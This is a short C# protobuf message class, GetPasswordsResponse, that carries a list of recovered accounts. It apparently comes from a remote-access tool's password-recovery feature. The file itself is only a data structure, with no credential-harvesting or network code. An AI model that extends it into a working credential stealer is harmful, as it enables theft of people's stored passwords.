using ProtoBuf;
using Rouzzf.Common.Models;
using System.Collections.Generic;

namespace Rouzzf.Common.Messages
{
    [ProtoContract]
    public class GetPasswordsResponse : IMessage
    {
        [ProtoMember(1)]
        public List<RecoveredAccount> RecoveredAccounts { get; set; }
    }
}
